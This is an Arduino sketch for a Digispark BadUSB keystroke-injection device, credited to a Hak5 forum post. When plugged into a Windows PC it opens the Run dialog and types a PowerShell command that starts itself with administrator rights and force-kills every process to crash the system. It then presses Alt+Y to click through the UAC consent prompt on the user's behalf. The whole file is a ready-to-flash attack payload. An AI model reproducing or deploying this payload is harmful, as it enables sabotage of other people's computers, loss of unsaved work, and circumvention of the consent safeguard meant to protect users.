//Original concept by DarkN3ss https://forums.hak5.org/topic/33268-payload-windows-bsod/
// This scripts Runs PS as admin and kills all process, so user should have admin level privileges for successful crash.

#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs {get-process | stop-process -force}"); //Giving the kill command as admin
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); //Saying yes for user after some wait
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
